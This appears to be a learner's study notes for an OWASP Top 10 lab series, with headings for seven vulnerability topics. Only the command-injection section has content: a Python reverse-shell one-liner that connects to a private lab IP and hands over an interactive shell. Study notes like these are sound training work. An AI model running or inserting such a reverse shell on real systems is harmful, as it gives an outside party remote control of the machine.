# OWASP TOP 10

## Day 1 : Command Injection

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.9.183",3301));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
```

## Day 2 : Broken Authentication

## Day 3 : Sensitive data exposure

## Day 4 : XML External Entity

## Day 5 : Broken Access Control

## Day 6 : Security Misconfiguration
## Day 7 : Cross-site Scripting
